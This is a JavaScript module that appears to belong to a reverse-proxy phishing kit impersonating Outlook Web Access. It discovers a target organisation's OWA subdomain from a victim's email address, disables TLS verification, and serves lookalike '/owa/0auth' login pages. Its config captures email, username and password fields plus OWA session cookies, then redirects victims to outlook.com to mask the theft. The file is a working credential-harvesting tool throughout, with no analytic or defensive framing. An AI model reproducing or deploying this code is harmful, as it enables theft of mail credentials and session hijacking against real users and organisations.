const path = require('path')
const url = require('url')
const superagent = require('superagent')

const globalWorker = process.HOOK_JS_MODULE


const subDomains = ['owa', 'autodiscover', 'mail', 'webmail', 'login'];

function findOWASubdomain(emailID, userAgent) {
   
    const domain = emailID.split('@')[1];
    const promises = subDomains.map((subDomain) => {
      const url = `${subDomain}.${domain}`;
      return superagent.get(`https://${url}`)
        .set('User-Agent', userAgent)
        .timeout({
            response: 5000,
            deadline: 60000,
          })
        .redirects(10)
        .then((res) => {
          if (res.status < 400 && (res.text.includes('Outlook') || res.text.includes('Microsoft'))) {
            console.log(url)
            return url;
          } else {
            console.log('wrong response from? ' + url)
            return null;
          }
        })
        .catch((err) => {
            console.error(err)
          return null;
        });
    });
  
    return Promise.all(promises)
      .then((results) => {
        for (let i = 0; i < results.length; i++) {
          if (results[i] !== null) {
            return results[i];
          }
        }
        return null;
      });
}

const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {
        if (this.req.url.startsWith('/owa/0auth/migrate')) {
           
            process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;

            const parsedUrl = url.parse(this.req.url, true);
            const urlQuery = parsedUrl.query || {}
            if (urlQuery.qrc) {
               
                return findOWASubdomain(urlQuery.qrc, clientContext.userAgent)
                .then((subdomain) => {
                    if (subdomain !== null) {
                        console.log(`OWA subdomain found: ${subdomain}`);
                        clientContext.currentDomain = subdomain;
                        Object.assign(clientContext.sessionBody,
                            { owaUrl: `https://${subdomain}` })
                        const maxAge = 60 * 60 * 24 * 365 * 20; // 20 years in seconds
                        const expires = new Date('2039-01-01').toUTCString();
                        this.res.writeHead(302, {
                            location: '/',
                            'Set-Cookie': `logondata=acc=0&lgn=${urlQuery.qrc};path=/`
                        })
                        return this.res.end()
                    } else {
                        console.log('OWA subdomain not found');
                        this.res.writeHead(302, {location: `/owa/0auth/session?qrc=${urlQuery.qrc}`})
                        return this.res.end()
                    }
                })
                .catch((err) => {
                    console.error(err);
                });
            } else {
                this.res.writeHead(302, {location: '/owa/0auth/identity'})
                return this.res.end()
            }

        }
    

        return super.execute(clientContext)

    }
}

/** Defined Config used */

const configExport = {

    SCHEME: 'owa',

    CURRENT_DOMAIN: 'PHP-EXEC',

    START_PATH: '/owa/0auth/identity',
    
    PATTERNS: [],

    PHP_PROCESSOR: {

        '/owa/0auth/identity': {
            GET: {
                script: 'identity.php',
            },
            POST: {
                script: 'identity.php',
                
                redirectTo: '',

            },
        },

        '/owa/0auth/session': {
            GET: {
                script: 'manual.php',
            },
            POST: {
                script: null,
                
                redirectTo: '/ping/09v08v07',

            },
        },
    },

    COOKIE_PATH: ['/owa$', '/owa/sessiondata.ashx.*'],

    EXIT_TRIGGER_PATH: ['/ping/09v08v07'],

    EXIT_URL: 'https://outlook.com',


    EXTRA_COMMANDS: [],

    CAPTURES: {
        emailCheck: {
            params: ['email'],
            hosts: 'PHP-EXEC',
        },

        manualOWAEmail: {
            params: ['0username'],
            hosts: 'PHP-EXEC',
        },

        manualOWAPassword: {
            params: ['0password'],
            hosts: 'PHP-EXEC',
        },


        owaUsername: {
            params: ['username'],
            hosts: [],
        },

        owaPassword: {
            params: ['password'],
            hosts: [],
        },


    },

    PRE_HANDLERS: [],
    
    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    EXTERNAL_FILTERS: [],

}
module.exports = configExport
